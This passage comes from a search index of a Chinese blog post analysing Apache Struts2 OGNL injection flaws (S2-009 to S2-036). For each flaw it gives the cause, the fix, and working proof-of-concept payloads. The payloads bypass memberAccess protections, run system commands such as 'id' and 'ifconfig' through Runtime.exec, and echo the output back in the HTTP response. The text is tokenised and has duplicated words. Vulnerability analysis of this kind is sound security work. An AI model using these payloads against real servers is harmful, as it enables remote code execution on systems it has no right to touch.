\u5e26\u5165   \u6ce8\u610f \u8fd9\u91cc \u7684 param \u9700\u8981 \u662f \u5f53\u524d Action \u7684 \u4e00\u4e2a \u7c7b \u5c5e\u6027 \uff08 \u4e5f \u5c31\u662f \u539f\u672c \u5c31 \u5b58\u5728 \u7684 \u53c2\u6570 \u540d \uff09 \uff0c \u6bd4\u5982 \u539f\u672c \u8868\u5355 \u91cc \u5c31 \u6709 password \uff0c \u90a3\u4e48 \u4f60 \u5c31 \u53ef\u4ee5 \u5728 password \u91cc\u9762 \u586b\u5145 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u56e0\u4e3a \u5728 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   ( password ) ( bla )   \u7684 \u65f6\u5019 ( \u89e3\u6790 \u51fa \u4e24\u4e2a ASTProperty )   \u540e\u7eed \u518d \u6267\u884c \u8fc7\u7a0b \u4e2d \uff0c \u4f1a \u53bb \u67e5\u627e \u5f53\u524d \u7684 action \u91cc\u9762 \u662f\u5426 \u542b\u6709 \u8fd9\u4e2a \u5c5e\u6027   com . opensymphony . xwork2 . ognl . accessor . CompoundRootAccessor # getProperty   \u5982\u679c \u5f53\u524d \u5b58\u5728 \u8fd9\u4e2a \u5c5e\u6027 \u7684 \u65f6\u5019 \uff0c \u8fd4\u56de \u5176 \u5185\u5bb9   \u540e\u7eed \u5c31\u662f \u8ddf   ( 1 ) ( 2 )   \u8fd9\u79cd \u6267\u884c \u7684 \u539f\u7406 \u4e00\u6837 \uff0c \u4f1a\u4ee5   ( 1 )   \u4f5c\u4e3a node \u8c03\u7528 getValue \u3002   \u8fd9\u91cc \u5de7\u5999 \u7684 \u5c31\u662f \u5229\u7528 \u8fd9\u79cd \u4e2d\u8f6c \u7684 \u65b9\u5f0f \uff0c \u89c4\u907f \u4e86 \u53c2\u6570 \u540d \u7684 \u6b63\u5219 \u68c0\u6d4b","title":"6 .   S2 - 009"},{"location":"blog/2020/talk_about_struts2/#poc_5","text":"?   password   =   (   %   23 _   memberAccess   .   allowStaticMethodAccess   =   true   ,   %   23   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   /   System   /   Applications   /   Calculator   .   app   '   ) )   &   z   [   (   password   ) (   bla   )   ] =   1   / /   \u56de\u663e POC   ?   password   =   (   %   23 _   memberAccess   .   allowStaticMethodAccess   =   true   ,   %   23   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   %   23   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ,   %   23   isr   =   new   java   .   io   .   InputStreamReader   (   %   23   ret   .   getInputStream   ( ) ) ,   %   23   br   =   new   java   .   io   .   BufferedReader   (   %   23   isr   ) ,   %   23   res   =   new   char   [   2000   ]   ,   %   23   br   .   read   (   %   23   res   ) ,   %   23   writer   =   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getWriter   ( ) ,   %   23   writer   .   println   (   new   java   .   lang   .   String   (   %   23   res   ) ) ,   %   23   writer   .   flush   ( ) ,   %   23   writer   .   close   ( ) )   &   z   [   (   password   ) (   bla   )   ] =   1","title":"POC"},{"location":"blog/2020/talk_about_struts2/#_6","text":"\u6539\u8fdb \u4e86 \u6b63\u5219   \u589e\u52a0 \u4e86   setParameter   \u51fd\u6570 \uff0c \u9ed8\u8ba4 \u8bbe\u7f6e \u9ed8\u8ba4\u8bbe\u7f6e \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u4e0d\u53ef \u6267\u884c","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#7-s2-012","text":"\u5f71\u54cd \u8303\u56f4 \uff1a Struts   Showcase   App   2.0 . 0   -   Struts   Showcase   App   2.3 . 14.2   The   second   evaluation   happens   when   redirect   result   reads   it   from   the   stack   and   uses   the   previously   injected   code   as   redirect   parameter .   This   lets   malicious   users   put   arbitrary   OGNL   statements   into   any   unsanitized   String   variable   exposed   by   an   action   and   have   it   evaluated   as   an   OGNL   expression   to   enable   method   execution   and   execute   arbitrary   methods ,   bypassing   Struts   and   OGNL   library   protections .   \u770b \u63cf\u8ff0 \u53ef\u4ee5 \u77e5\u9053 \u662f struts2 \u5728 \u5904\u7406 redirect \u7684 \u65f6\u5019 \u51fa\u73b0 \u7684 \u95ee\u9898 \u3002   \u7ed3\u679c \u8fd4\u56de \u540e \u56de\u53bb \u8c03\u7528   ServletRedirectResult   \u6765 \u5904\u7406   \u6765 \u770b\u770b \u8be5 \u5bf9\u8c61 \u7684 \u5b9e\u9645 \u5904\u7406 \u51fd\u6570 \u5904\u7406\u51fd\u6570   org . apache . struts2 . dispatcher . ServletRedirectResult # execute   \u5728 \u7236\u7c7b execute \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u4e86   conditionalParse   \u51fd\u6570   \u8fd9\u91cc \u51fa\u73b0 \u4e86 \u6211\u4eec \u6bd4\u8f83 \u719f\u6089 \u7684   TextParseUtil . translateVariables   \uff0c S2 - 001 \u5c31\u662f \u7531 \u8fd9\u4e2a \u51fd\u6570 \u6765 \u5904\u7406 String \u7c7b\u578b \u8f6c\u5316 \u7684 \u3002   \u6b64\u65f6 param \u4e3a \u6211\u4eec \u5728 struts . xml \u4e2d \u7684 \u914d\u7f6e   edit . action ? skillName = $ { currentSkill . name }   \u524d\u9762 \u5206\u6790 \u8fc7   translateVariables   \uff0c \u8fd9\u91cc \u76f4\u5207 \u4e3b\u9898   \u51fa \u95ee\u9898 \u7684 \u5730\u65b9 \u8ddf S2 - 001 \u4e00\u6837   \u89e6\u53d1 \u603b\u5171 \u5206\u4e3a \u4e24\u6b65 \uff1a   \u5c06 xml \u914d\u7f6e \u4e2d   $ { currentSkill . name }   \u89e3\u6790 \u6210 \u4f20\u5165 \u7684 \u503c \uff0c \u6b64\u65f6 stack . findValue \u4f1a \u53bb \u627e\u5230 \u524d\u9762 \u5904\u7406 \u597d\u540e \u7684 Result \u91cc\u9762 \u7684 currentSkill . name \u7684 \u503c   \u7531\u4e8e   translateVariables   \u7684 \u89e3\u6790 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6709 \u4e24\u79cd   $   \u3001   %   \uff0c \u5e76\u4e14 \u662f \u5faa\u73af \u53bb \u5904\u7406 \u7684   \u9996\u5148 \u662f \u53bb \u5904\u7406   $   \uff0c \u5c06   $ { currentSkill . name }   \u89e3\u6790 \u6210 \u5177\u4f53 \u7684 \u503c \uff0c \u5e76\u4e14 \u5c06 result \u7684 \u503c\u7f6e \u4e3a \u4ed6 \u7684 \u5185\u5bb9   \u867d\u7136 \u5df2\u7ecf \u4fee\u590d \u4e86 \u5faa\u73af \u9012\u5f52 \u6267\u884c \u7684 \u95ee\u9898 ( s2 - 001 \u4f1a \u6267\u884c \u4e24\u5c42   $ { }   ) \uff0c \u4f46\u662f \u56e0\u4e3a \u8fd8 \u5faa\u73af \u53bb \u5904\u7406   %   \uff0c \u90a3\u4e48 \u4ecd\u7136 \u53ef\u4ee5 \u8fbe\u5230 \u5faa\u73af \u9012\u5f52 \u8ba1\u7b97 \u9012\u5f52\u8ba1\u7b97 \u7684 \u6548\u679c   $ { \u53e6 \u4e00\u5c42 \u4ee5 % \u8d77\u59cb \u7684 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f }   \uff0c \u6240\u4ee5 POC \u91cc\u9762 \u9700\u8981 \u7528   % { }   \u6765 \u5199\u5165 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u6240\u4ee5 \u5bf9\u4e8e S2 - 012 \u6765\u8bf4 \uff0c \u914d\u7f6e \u4e2d   $ { currentSkill . name }   \u662f \u81f3\u5173 \u91cd\u8981 \u81f3\u5173\u91cd\u8981 \u7684","title":"7 .   S2 - 012"},{"location":"blog/2020/talk_about_struts2/#_7","text":"\u7531\u4e8e \u6211 \u524d\u9762 \u5206\u6790 \u7684 \u662f   2.2 . 3   \u7248\u672c \uff0c \u540e\u7eed \u7684 \u7248\u672c \u7684   translateVariables   \u53d8\u5316 \u6709\u70b9 \u5927 \uff0c \u5176 \u4fee\u590d \u7248\u672c   \u589e\u52a0 \u4e86 pos \u6765 \u505a \u8d77\u59cb \u4f4d\u7f6e \u6765 \u67e5\u627e   $ { } % { }   \uff0c \u5728 \u7b2c\u4e00 \u4e00\u6b21 \u7b2c\u4e00\u6b21 \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u5b8c\u6210 \u540e \u4f1a \u66f4\u65b0 pos \u503c \uff0c \u6765 \u9632\u6b62 \u4e8c\u6b21 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#poc_6","text":"currentSkill . name = % { ( #_ memberAccess [ ' allowStaticMethodAccess ' ] = true , # context [ ' xwork . MethodAccessor . denyMethodExecution ' ] = false , @ java . lang . Runtime @ getRuntime ( ) . exec ( ' open   / System / Applications / Calculator . app ' ) ) }   / /   \u56de\u663e POC   % { ( #_ memberAccess [ ' allowStaticMethodAccess ' ] = true , # context [ ' xwork . MethodAccessor . denyMethodExecution ' ] = false , # ret = @ java . lang . Runtime @ getRuntime ( ) . exec ( ' id ' ) , # isr = new   java . io . InputStreamReader ( # ret . getInputStream ( ) ) , # br = new   java . io . BufferedReader ( # isr ) , # res = new   char [ 2000 ] , # br . read ( # res ) , # writer = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , # writer . println ( new   java . lang . String ( # res ) ) , # writer . flush ( ) , # writer . close ( ) ) }","title":"POC"},{"location":"blog/2020/talk_about_struts2/#8-s2-013s2-014","text":"\u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 14.1   \u8fd9\u6b21 \u7684 \u539f\u7406 \u8ddf S2 - 001 \u7c7b\u4f3c \uff0c \u53ea\u662f \u95ee\u9898 \u51fa \u5728 \u89e3\u6790   < s : a >   \u3001   < s : url >   \uff0c \u5f53 \u8fd9 \u4e24\u4e2a \u6807\u7b7e \u652f\u6301   includeParams   \u5f53 \u5f53\u524d \u7684 href \u4e3a \u7a7a\u65f6 \uff0c \u4f1a \u7528 \u5f53\u524d url \u6765 \u586b\u5145 href \uff0c \u4e5f \u5c31\u662f \u5728   buildUrl   \u65f6 \u5bfc\u81f4 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u8fd9\u91cc \u4e0d \u5177\u4f53 \u5206\u6790 \u5177\u4f53\u5206\u6790 \u4e86 \uff0c \u770b \u4e00\u4e0b \u4ed6 \u7684 \u6267\u884c \u6808   org . apache . struts2 . views . util . DefaultUrlHelper # translateVariable   \u4e5f \u540c\u6837 \u662f \u4f7f\u7528 String \u8f6c\u6362 \u65f6 \u51fa\u73b0 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c","title":"8 .   S2 - 013 / S2 - 014"},{"location":"blog/2020/talk_about_struts2/#poc_7","text":"?   fakeParam   = %   { (   %   23 _   memberAccess   [   '   allowStaticMethodAccess   '   ] =   true   ,   %   23   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   /   System   /   Applications   /   Calculator   .   app   '   ) ) }   / /   \u56de\u663e POC   ?   fakeParam   = %   { (   %   23 _   memberAccess   [   '   allowStaticMethodAccess   '   ] =   true   ,   %   23   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   %   23   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ,   %   23   isr   =   new   java   .   io   .   InputStreamReader   (   %   23   ret   .   getInputStream   ( ) ) ,   %   23   br   =   new   java   .   io   .   BufferedReader   (   %   23   isr   ) ,   %   23   res   =   new   char   [   2000   ]   ,   %   23   br   .   read   (   %   23   res   ) ,   %   23   writer   =   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getWriter   ( ) ,   %   23   writer   .   println   (   new   java   .   lang   .   String   (   %   23   res   ) ) ,   %   23   writer   .   flush   ( ) ,   %   23   writer   .   close   ( ) ) }","title":"POC"},{"location":"blog/2020/talk_about_struts2/#_8","text":"\u8fd9\u91cc   org . apache . struts2 . views . util . DefaultUrlHelper   \u4e0d\u518d \u4f7f\u7528 TextParseUtil \u6765 \u5904\u7406","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#9-s2-015","text":"\u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 14.2   S2 - 015 \u4e00\u5171 \u6709 \u4e24\u79cd \uff1a   \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u6f0f\u6d1e \u539f\u7406 \u8ddf S2 - 012 \u7c7b\u4f3c \uff0c \u8fd9\u6b21 \u95ee\u9898 \u4e0d\u662f \u51fa \u5728 \u5b9a\u5411 \u91cd\u5b9a\u5411 \uff0c \u800c\u662f \u5728 \u89e3\u6790 \u5177\u4f53 \u7684 action   name \u65f6 \u51fa\u73b0 \u7684 \u95ee\u9898   \u8fd9\u91cc \u7684   { 1 }   \u4f1a \u88ab \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210   xxx . action   \u7684   xxx   \uff0c \u8fd9\u91cc \u7684   xxx   \u5982\u679c \u88ab \u6211\u4eec \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u4f1a \u5728 \u540e\u7eed \u7684   TextParseUtil . translateVariables   \u5f97\u5230 \u6267\u884c \uff0c \u8fc7\u7a0b \u8ddf S2 - 012 \u4e00\u6837 \uff0c \u4e0d\u518d \u53d9\u8ff0 \u3002   \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u662f \u7ed3\u679c \u7531 httpheader \u6765 \u5904\u7406 \u65f6 \uff0c \u4f1a \u5c06 \u6211\u4eec \u7684   $ { message }   \u5d4c\u5957 \u6267\u884c   org . apache . struts2 . dispatcher . HttpHeaderResult # execute   \u8ddf S2 - 012 \u4e00\u6837 \uff0c \u89e3\u6790 \u6267\u884c   $ { \u53e6 \u4e00\u5c42 \u4ee5 % \u8d77\u59cb \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f }","title":"9 .   S2 - 015"},{"location":"blog/2020/talk_about_struts2/#poc_8","text":"/ /   \u6458\u81ea https : / / www . freebuf . com / vuls / 217482 . html   % 24% 7B% 23context% 5B% 27xwork . MethodAccessor . denyMethodExecution% 27% 5D% 3Dfalse% 2C% 23m% 3D% 23 _ memberAccess . getClass% 28% 29 . getDeclaredField% 28% 27allowStaticMethodAccess% 27% 29% 2C% 23m . setAccessible% 28true% 29% 2C% 23m . set% 28% 23 _ memberAccess% 2Ctrue% 29% 2C% 23q% 3D @ org . apache . commons . io . IOUtils @ toString% 28 @ java . lang . Runtime @ getRuntime% 28% 29 . exec% 28% 27ifconfig% 27% 29 . getInputStream% 28% 29% 29% 2C% 23q% 7D . action   / /   \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd   \uff1f message = % { # context [ ' xwork . MethodAccessor . denyMethodExecution ' ] = false , # m = #_ memberAccess . getClass ( ) . getDeclaredField ( ' allowStaticMethodAccess ' ) , # m . setAccessible ( true ) , # m . set ( #_ memberAccess , true ) , # q = @ org . apache . commons . io . IOUtils @ toString ( @ java . lang . Runtime @ getRuntime ( ) . exec ( ' ifconfig ' ) . getInputStream ( ) ) , # writer = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , # writer . println ( # q ) , # writer . flush ( ) , # writer . close ( ) }   \u8fd9\u91cc \u6bd4\u8f83 \u7279\u6b8a \u7684 \u662f \u8fd9\u91cc \u5bf9 \u539f\u6709   #_ memberAccess [ ' allowStaticMethodAccess ' ] = true   \uff0c \u6539\u6210 \u4e86   / /   \u539f\u6765 \u7684 \u65b9\u5f0f   #   _ memberAccess   [   '   allowStaticMethodAccess   '   ] =   true   / /   \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u6765 \u8bbe\u7f6e #_ memberAccess [ ' allowStaticMethodAccess ' ]   #   m   =   #   _ memberAccess   .   getClass   ( ) .   getDeclaredField   (   '   allowStaticMethodAccess   '   ) ,   #   m   .   setAccessible   (   true   ) ,   #   m   .   set   (   #   _ memberAccess   ,   true   )   \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u8981 \u901a\u8fc7 \u8fd9\u79cd \u65b9\u5f0f \u6765 \u5199\u5165 \u5462 \uff1f   \u5148 \u6765\u770b OGNL \u662f \u600e\u4e48 setValue \u7684   ognl . OgnlRuntime # setFieldValue   \u800c \u6b64\u65f6 \u8fd9\u91cc \u6211\u4eec \u8981 \u8bbe\u7f6e \u7684   #_ memberAccess [ ' allowStaticMethodAccess ' ]   \u662f final \u7c7b\u578b \uff0c \u6211\u4eec \u4e0d\u80fd \u4f7f\u7528 \u666e\u901a \u7684 \u65b9\u5f0f \u6539\u53d8 \u4ed6 \u7684 \u503c \uff0c \u53ea\u80fd \u901a\u8fc7 \u4e0a\u9762 \u7684 \u53cd\u5c04 \u7684 \u65b9\u5f0f \u6765 \u8fdb\u884c \u4fee\u6539 \u3002   \u8fd9\u91cc \u7684 \u6539\u53d8 \u662f\u4ece struts2   2.3 . 14.1 \u7248\u672c \u5f00\u59cb \u7684 \uff0c \u610f\u5473 \u610f\u5473\u7740 \u9ad8\u4e8e \u8fd9\u4e2a \u7248\u672c \u7684 \u4ee5\u540e \u7684 poc \u53ea\u80fd \u901a\u8fc7 \u8fd9\u79cd \u65b9\u5f0f \u6765 \u8bbe\u7f6e   \u9664\u4e86 \u4e0a\u9762 \u901a\u8fc7 \u53cd\u5c04 \u673a\u5236 \u6765 \u8fdb\u884c \u7ed5\u8fc7 \uff0c \u6211\u4eec \u4e5f \u53ef\u4ee5 \u76f4\u63a5 \u7528 \u6784\u9020 \u5668 \u7684 \u65b9\u6cd5 \u6765 \u6267\u884c \uff0c \u6bd4\u5982   new   ProccessBuilder ( ' id ' ) . start ( )","title":"POC"},{"location":"blog/2020/talk_about_struts2/#_9","text":"\u8fd9\u91cc \u7684 \u4fee\u590d \u5c31\u662f S2 - 012 \u7684 \u4fee\u590d \uff0c \u4e3b\u8981 \u4fee\u590d \u4e86 \u6267\u884c \u8fd9\u79cd OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   $ { \u53e6 \u4e00\u5c42 % \u8d77\u59cb \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f }","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#10-s2-016","text":"\u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 15   S2 - 016 \u95ee\u9898 \u51fa \u5728 \u5904\u7406 \u9ed8\u8ba4 \u7684   action : xxx   \u6216   redirect : xxx   \uff0c \u540e\u9762 \u8ddf \u7684   xxx   \u4e3a OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c Struts2 \u9ed8\u8ba4 \u5c06 \u7528   ServletRedirectResult   \u6765 \u5904\u7406 \u8df3\u8f6c \u95ee\u9898 \uff0c \u8fd9\u91cc \u8ddf S2 - 012 \u4e00\u6837 \uff0c \u53ea\u662f \u8fd9\u91cc \u7684 \u8df3\u8f6c \u8bbe\u7f6e \u5728 url \u91cc\u9762   \u6267\u884c \u94fe\u8def \u8ddf S2 - 012 \u4e00\u6837 \uff0c \u4e0d \u4f5c \u5206\u6790 \u4e86","title":"10 .   S2 - 016"},{"location":"blog/2020/talk_about_struts2/#poc_9","text":"redirect   :   %   {   #   context   [   '   xwork   .   MethodAccessor   .   denyMethodExecution   '   ] =   false   ,   #   m   =   #   _ memberAccess   .   getClass   ( ) .   getDeclaredField   (   '   allowStaticMethodAccess   '   ) ,   #   m   .   setAccessible   (   true   ) ,   #   m   .   set   (   #   _ memberAccess   ,   true   ) ,   #   q   =   @ org . apache . commons . io . IOUtils @ toString   (   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) .   getInputStream   ( ) ) ,   #   writer   =   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getWriter   ( ) ,   #   writer   .   println   (   #   q   ) ,   #   writer   .   flush   ( ) ,   #   writer   .   close   ( ) }","title":"POC"},{"location":"blog/2020/talk_about_struts2/#_10","text":"org . apache . struts2 . dispatcher . mapper . DefaultActionMapper   \u9ed8\u8ba4 \u7684   redirect / redirectaction   \u76f4\u63a5 \u88ab \u5220\u9664 \u4e86   action :   \u90e8\u5206 \u56e0\u4e3a S2 - 015 \u7684 \u5173\u7cfb \uff0c \u9650\u5236 \u4e86 action \u540d   \u5df2\u7ecf \u4e0d \u6784\u6210 \u5a01\u80c1 \u6784\u6210\u5a01\u80c1 \u4e86","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#11-s2-019","text":"\u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 15.1   S2 - 019 \u8ddf S2 - 008 \u7684 \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u6f0f\u6d1e \u4e00\u6837 \uff0c \u5f53 \u5f00\u542f \u5f00\u53d1 \u5f00\u53d1\u8005 \u6a21\u5f0f \u65f6 \uff0c \u5141\u8bb8 \u4f7f\u7528 command \u7684 \u6a21\u5f0f \u6765 \u6267\u884c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u5177\u4f53 \u770b S2 - 008","title":"11 .   S2 - 019"},{"location":"blog/2020/talk_about_struts2/#poc_10","text":"? debug = command & expression = ( % 23context [ ' xwork . MethodAccessor . denyMethodExecution ' ] = false , % 23m = % 23 _ memberAccess . getClass ( ) . getDeclaredField ( ' allowStaticMethodAccess ' ) , % 23m . setAccessible ( true ) , % 23m . set ( % 23 _ memberAccess , true ) , % 23q = @ org . apache . commons . io . IOUtils @ toString ( @ java . lang . Runtime @ getRuntime ( ) . exec ( ' id ' ) . getInputStream ( ) ) , % 23writer = @ org . apache . struts2 . ServletActionContext @ getResponse ( ) . getWriter ( ) , % 23writer . println ( % 23q ) , % 23writer . flush ( ) , % 23writer . close ( ) )","title":"POC"},{"location":"blog/2020/talk_about_struts2/#_11","text":"\u8fd9\u91cc \u540e\u9762 \u7684 \u51e0\u4e2a \u7248\u672c \u90fd \u662f \u5141\u8bb8 \u6267\u884c \u7684 \uff0c \u5f00\u53d1 \u5f00\u53d1\u8005 \u6a21\u5f0f \u4e0b \u7684 command \u5e76 \u6ca1\u6709 \u88ab \u53d6\u6d88 \u6389 \uff0c \u6240\u4ee5 \u5982\u679c \u5728\u7ebf \u4e0a \u73af\u5883 \u78b0\u5230 debug \u6a21\u5f0f \uff0c \u90a3 \u5c31 \u53ef\u4ee5 \u5c1d\u8bd5 \u4e00\u4e0b OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c   \u4f46\u662f \u7531\u4e8e \u4ece struts2   2.3 . 20 \u4e4b\u540e \u5f15\u5165 \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u6a21\u5f0f \uff08 excludedClasses ,   excludedPackageNames   \u548c   excludedPackageNamePatterns \uff09 \uff0c \u5e76\u4e14 \u4f7f\u7528 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u7684 \u65b9\u5f0f \u4e5f \u5931\u6548 \u4e86   \u8fd9\u91cc \u524d\u8f88 \u4eec \u7528\u5230 \u4e86 \u5c06 SecurityMemberAccess \u521d\u59cb \u521d\u59cb\u5316 \u7684 \u65b9\u5f0f \u6765 \u7ed5\u8fc7 \u8fd9\u4e2a \u9650\u5236 \uff0c \u539f\u7406 \u53ef\u4ee5 \u597d\u597d \u770b\u770b \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 https : / / paper . seebug . org / 794 / # 33 - struts - 2329 \u3002   debug   =   command   &   expression   =   ( (   #   _ memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) . (   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   + /   System   /   Applications   /   Calculator   .   app   '   ) ) )   \u540e\u7eed \u8fd8\u6709 \u4e00\u4e9b \u7ed5\u8fc7 \uff0c \u540e\u9762 \u518d \u8bb2","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#12-s2-029s2-036","text":"S2 - 029 \u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 24.1   ( except   2.3 . 20.3 )   S2 - 036 \u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 0   -   Struts   2.3 . 28.1   \uff08 \u8ddf S2 - 029 \u4e00\u6837 \uff0c \u4e3b\u8981 \u5728 \u4fee\u590d \u7684 \u5730\u65b9 \u8bb2 \uff09   \u539f\u7406 \u8ddf S2 - 001 \u4e0d\u591a \u5dee\u4e0d\u591a \uff0c S2 - 029 \u7684 \u89e6\u53d1 \u9700\u8981 jsp \u7528\u5230 \u6807\u7b7e   < s : textfield   name = \" % { xxxx } \" > < / s : textfield >   \uff0c name \u5c5e\u6027 \u4e2d \u7531 \u4e00 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u89e3\u6790 \u800c \u5f97 \uff0c \u610f\u5473 \u610f\u5473\u7740 \u751f\u6210 \u7684 input \u6807\u7b7e \u7684 name \u5c5e\u6027 \u662f \u52a8\u6001 \u8ba1\u7b97 \u800c \u5f97 \u7684 \uff0c \u6bd4\u5982 ? xxxx = username \uff0c \u6b64\u65f6 \u89e3\u6790 \u5f97\u5230 \u7684 input . name \u4e3a username \u3002 \u8fd9 \u5176\u4e2d \u6267\u884c \u4e86   % { xxxx }   \uff0c \u83b7\u5f97 xxxx \u7684 \u5185\u5bb9 \u3002 \u800c S2 - 001 \u7684 \u4fee\u590d \u4e3b\u8981 \u89e3\u51b3 \u7684 \u662f \u9012\u5f52 \u8ba1\u7b97 \u9012\u5f52\u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u95ee\u9898 \uff0c S2 - 029 \u5c31\u662f \u5728 \u8fdb\u5165 translateVariables \u4e4b\u524d \u5c31 \u5c06 \u7b2c\u4e00 \u4e00\u5c42 \u7b2c\u4e00\u5c42 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u5b8c\u6bd5   \u76f4\u63a5 \u770b   UIBean . evaluateParams   \u9996\u5148 \u8ba1\u7b97   % { message }   \u5230 \u6211\u4eec \u4f20\u5165 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f   \u540e\u7eed \u4f1a \u5728 \u6211\u4eec \u4f20\u5165 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u62ec \u4e0a   % { xxx }   \u6b64\u65f6 \u518d \u4f20\u5165 \u5230   findValue   \u5c31\u662f \u7b2c\u4e8c \u4e8c\u5c42 \u7b2c\u4e8c\u5c42 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u540e\u7eed \u8ddf S2 - 001 \u4e00\u6837 \uff0c \u53ea \u9700\u8981 \u6267\u884c \u4e00\u6b21 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u8ba1\u7b97 \u5373\u53ef","title":"12 .   S2 - 029 / S2 - 036"},{"location":"blog/2020/talk_about_struts2/#poc_11","text":"/ /   \u9700\u8981 \u5148 \u521d\u59cb \u521d\u59cb\u5316 SecurityMemberAccess \uff0c \u4e0d\u7136 \u65e0\u6cd5 \u6267\u884c   ?   message   =   ( (   %   23 _   memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) . (   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   open   + /   System   /   Applications   /   Calculator   .   app   '   ) ) )   / /   \u56de\u663e POC   ?   message   =   (   %   23 _   memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ,   %   23   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ) ,   %   23   q   =   @ org . apache . commons . io . IOUtils @ toString   (   %   23   ret   .   getInputStream   ( ) )   / /   S2 - 036   ( (   #   _ memberAccess   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) . (   #   ret   =   @ java . lang . Runtime @ getRuntime   ( ) .   exec   (   '   id   '   ) ) ) . (   #   q   =   @ org . apache . commons . io . IOUtils @ toString   (   #   ret   .   getInputStream   ( ) ) )","title":"POC"},{"location":"blog/2020/talk_about_struts2/#s2-029","text":"com . opensymphony . xwork2 . ognl . OgnlUtil # compileAndExecute   \u5728 \u8ba1\u7b97 \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u4e4b\u524d \uff0c \u9a8c\u8bc1 \u662f\u5426 \u53ef\u4ee5 \u6267\u884c   \u8fd9\u91cc \u5148\u770b   node . isEvalChain 